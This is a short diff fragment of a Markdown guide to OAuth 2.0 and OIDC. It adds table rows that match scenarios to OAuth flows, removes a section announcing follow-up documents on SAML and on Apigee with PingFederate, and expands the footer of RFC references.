+| Service-to-service API calls | OAuth 2.0 (Client Credentials) |
+| Need real-time token revocation | Opaque tokens + Introspection endpoint |
+| Smart TV / CLI authentication | OAuth 2.0 Device Code |
 
 ---
 
-## What comes next
-
-This document covers the OAuth 2.0 + OIDC protocols only. The next documents in this series:
-
-1. **SAML 2.0** — the enterprise XML-based federation protocol, how it compares to OIDC, SP-initiated vs IdP-initiated flows, assertions, and when organisations still need it
-2. **Apigee + PingFederate** — how to implement OAuth/OIDC token validation at the API gateway layer using Apigee policies and PingFederate as the Auth Server
-
----
-
-*OAuth 2.0: RFC 6749 | PKCE: RFC 7636 | Device Code: RFC 8628 | JWT: RFC 7519 | JWKS: RFC 7517 | OIDC Core 1.0 | OAuth 2.1: draft-ietf-oauth-v2-1*
+*OAuth 2.0: RFC 6749 · PKCE: RFC 7636 · Device Code: RFC 8628 · JWT: RFC 7519 · JWKS: RFC 7517 · Introspection: RFC 7662 · Revocation: RFC 7009 · OIDC Core 1.0 · OAuth 2.1: draft-ietf-oauth-v2-1 · Mix-up prevention: RFC 9207*
